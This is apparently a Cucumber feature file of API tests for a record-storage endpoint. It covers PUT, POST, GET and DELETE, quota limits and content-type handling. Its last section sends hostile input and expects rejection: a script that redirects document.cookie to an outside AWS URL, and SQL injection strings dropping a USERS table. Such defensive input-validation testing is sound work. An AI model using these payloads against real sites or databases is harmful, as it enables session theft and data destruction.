Feature: Verify all Endpoints

    Background: Set endpoint for test as well as cleanup records
        Given I set host and endpoint for test
            And I want to run "GET" method on my endpoint
        When I submit the request
        Then I receive status code 200
            And I want to store this value for deletion
        Given I want to run "DELETE" method on my endpoint
        When I submit multiple requests for record deletion
        Then I receive status code 200
    
# GET SPECIFIC TEST SECTION

    @smoke
    Scenario: Check get structure of exercise API
        Given I want to run "PUT" method on my endpoint
            And I set string body parameter value with value: test1
            And I set string body parameter main_key with value: my_key_for_test
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Given I want to run "GET" method on my endpoint
        When I submit the request
        Then I receive status code 200
            And Verify that response returned is list of objects with parameters value and main_key

# PUT SPECIFIC TEST SECTION

    Scenario Outline: Set specific record in data - Valid params
        Given I want to run "PUT" method on my endpoint
            And I set string body parameter value with value: <value_ex>
            And I set string body parameter main_key with value: <main_key_ex>
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 200
            And Expect response field value with value: <value_ex>
            And Expect response field main_key with value: <main_key_ex>

        Examples:
            | value_ex                 | main_key_ex               |
            | test!1                    | my_key_for_tes!t          |
            | 123                      | 133                       |
            | ăѣ𝔠ծềſģȟᎥ𝒋ǩľḿꞑȯ𝘱𝑞𝗋𝘴ȶ𝞄𝜈ψ𝒙𝘆𝚣 | ăѣ𝔠ծềſģȟᎥ𝒋ǩľḿꞑȯ𝘱𝑞𝗋𝘴ȶ𝞄𝜈ψ𝒙𝘆𝚣 | 
            | EmptyStr                 | EmptyStr                  | 
            | nullStr                  | nullStr                   | 


    Scenario Outline: Set specific record in data - Invalid params
        Given I want to run "PUT" method on my endpoint
            And I set <value_ex_type> body parameter value with value: <value_ex>
            And I set <main_key_ex_type> body parameter main_key with value: <main_key_ex>
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400
        
        #TODO: Figure out why second example returns error during request submit { unexpected token ' in json at position 0 at json.parse ( anonymous ) }
        Examples:
            | value_ex | value_ex_type | main_key_ex   | main_key_ex_type |
            | 123      | number        | main_key_test | string           |
            # | 123      | number        | 123           | number           |

    
    Scenario Outline: Check quota for insertion of records
            Given I want to run "PUT" method on my endpoint
            When I submit <no_req> the request with incremental value and main_key values
            Then I receive multiple status codes: <status_codes>
        Examples:
            | no_req | status_codes                                |
            | 10     | 200,200,200,200,200,200,200,200,200,200     |
            | 11     | 200,200,200,200,200,200,200,200,200,200,400 |


    Scenario: Insert same main_key using put
        Given I want to run "PUT" method on my endpoint
            And I set string body parameter value with value: same_key_put
            And I set string body parameter main_key with value: my_put_duplicate_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 200
            And Expect response field value with value: same_key_put
            And Expect response field main_key with value: my_put_duplicate_key
        Given I want to run "PUT" method on my endpoint
            And I set string body parameter value with value: different_key_put
            And I set string body parameter main_key with value: my_put_duplicate_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400
        
    Scenario Outline: Send as query param - PUT
        Given I want to run "Query_param_PUT" method on my endpoint
            And I set body parameter value as plain text with value: update_value
            And I set body parameter main_key as plain text with value: update_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400
        
    Scenario Outline: Invalid content type sent - PUT
        Given I want to run "PUT" method on my endpoint
            And I set body parameter value as plain text with value: update_value
            And I set body parameter main_key as plain text with value: update_main_key
            And I set header parameter Content-type with value: text/plain
        When I submit the request
        Then I receive status code 400

# POST SPECIFIC TEST SECTION

    Scenario Outline: Update record - Valid params
        Given I want to run "PUT" method on my endpoint
            And I set string body parameter value with value: update_value
            And I set string body parameter main_key with value: update_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 200
        Given I want to run "POST" method on my endpoint
            And I set string body parameter value with value: <value_ex>
            And I set string body parameter main_key with value: update_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 200
            And Expect response field value with value: <value_ex>
            And Expect response field main_key with value: update_main_key
        Given I want to run "GET" method on my endpoint
        When I submit the request
        Then I receive status code 200
            And Expect record with main_key: update_main_key, and it contains value param with value: <value_ex>

        Examples:
            | value_ex                 | main_key_ex               |
            | test!1                    | my_key_for_tes!t          |
            | 123                      | 133                       |
            | ăѣ𝔠ծềſģȟᎥ𝒋ǩľḿꞑȯ𝘱𝑞𝗋𝘴ȶ𝞄𝜈ψ𝒙𝘆𝚣 | ăѣ𝔠ծềſģȟᎥ𝒋ǩľḿꞑȯ𝘱𝑞𝗋𝘴ȶ𝞄𝜈ψ𝒙𝘆𝚣 | 
            | EmptyStr                 | EmptyStr                  | 
            | nullStr                  | nullStr                   | 


    Scenario Outline: Update record - Invalid params
        Given I want to run "PUT" method on my endpoint
            And I set string body parameter value with value: update_value
            And I set string body parameter main_key with value: update_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 200
        Given I want to run "POST" method on my endpoint
            And I set <value_ex_type> body parameter value with value: <value_ex>
            And I set string body parameter main_key with value: update_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400
        
    #TODO: Same as above tests figure out why second example returns error during request submit { unexpected token ' in json at position 0 at json.parse ( anonymous ) }
    Examples:
        | value_ex | value_ex_type | main_key_ex   | main_key_ex_type |
        | 123      | number        | main_key_test | string           |
        # | 123      | number        | 123           | number           |


    Scenario: Key not stored but tried to update
        Given I want to run "POST" method on my endpoint
            And I set string body parameter value with value: non_existing_value
            And I set string body parameter main_key with value: non_existing_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400
        
    Scenario Outline: Send as query param - POST
        Given I want to run "Query_param_POST" method on my endpoint
            And I set body parameter value as plain text with value: update_value
            And I set body parameter main_key as plain text with value: update_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400
        
    Scenario Outline: Invalid content type sent - POST
        Given I want to run "POST" method on my endpoint
            And I set body parameter value as plain text with value: update_value
            And I set body parameter main_key as plain text with value: update_main_key
            And I set header parameter Content-type with value: text/plain
        When I submit the request
        Then I receive status code 400


# DELETE SPECIFIC TEST SECTION

    Scenario Outline: Delete specific record
        Given I want to run "PUT" method on my endpoint
            And I set string body parameter value with value: delete_value
            And I set string body parameter main_key with value: delete_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 200
        Given I want to run "DELETE" method on my endpoint
            And I set string body parameter main_key with value: delete_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 200
            And Expect response field main_key with value: delete_main_key
        Given I want to run "GET" method on my endpoint
        When I submit the request
        Then I receive status code 200
            And Do not expect record with main_key: delete_main_key
        
    Scenario Outline: Send as query param - DELETE
        Given I want to run "Query_param_DELETE" method on my endpoint
            And I set body parameter main_key as plain text with value: update_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400
        
    Scenario Outline: Invalid content type sent - PUT
        Given I want to run "DELETE" method on my endpoint
            And I set body parameter value as plain text with value: update_value
            And I set body parameter main_key as plain text with value: update_main_key
            And I set header parameter Content-type with value: text/plain
        When I submit the request
        Then I receive status code 400


# BAD CODE SPECIFIC TEST SECTION
    Scenario Outline: Send bad code - POST
        Given I want to run "PUT" method on my endpoint
            And I set string body parameter value with value: update_value
            And I set string body parameter main_key with value: update_main_key
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 200
        Given I want to run "POST" method on my endpoint
            And I set string body parameter value with value: <value_param>
            And I set string body parameter main_key with value: <main_key_param>
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400

    Examples:
         | value_param            | main_key_param | 
         | <script> window.location='https://l761dniu80.execute-api.us-east-2.amazonaws.com/?cookie=' + document.cookie </script> | update_main_key | 
         | value_test1            | <script> window.location='https://l761dniu80.execute-api.us-east-2.amazonaws.com/?cookie=' + document.cookie </script> | 
         | '; DROP TABLE USERS;   | update_main_key | 
         | 1=1; DROP TABLE USERS; | update_main_key |
         | value_tes1             | '; DROP TABLE USERS; |
         | value_tes1             | 1=1; DROP TABLE USERS; |


    Scenario Outline: Send bad code - PUT
        Given I want to run "PUT" method on my endpoint
            And I set string body parameter value with value: <value_param>
            And I set string body parameter main_key with value: <main_key_param>
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400

    Examples:
         | value_param            | main_key_param | 
         | <script> window.location='https://l761dniu80.execute-api.us-east-2.amazonaws.com/?cookie=' + document.cookie </script> | update_main_key | 
         | value_test1            | <script> window.location='https://l761dniu80.execute-api.us-east-2.amazonaws.com/?cookie=' + document.cookie </script> | 
         | '; DROP TABLE USERS;   | update_main_key | 
         | 1=1; DROP TABLE USERS; | update_main_key |
         | value_tes1             | '; DROP TABLE USERS; |
         | value_tes1             | 1=1; DROP TABLE USERS; |


    Scenario Outline: Send bad code - DELETE
        Given I want to run "DELETE" method on my endpoint
            And I set string body parameter main_key with value: <main_key_param>
            And I set header parameter Content-type with value: application/json
        When I submit the request
        Then I receive status code 400

    Examples:
         | main_key_param | 
         | <script> window.location='https://l761dniu80.execute-api.us-east-2.amazonaws.com/?cookie=' + document.cookie </script> | 
         | '; DROP TABLE USERS; |
         | 1=1; DROP TABLE USERS; |
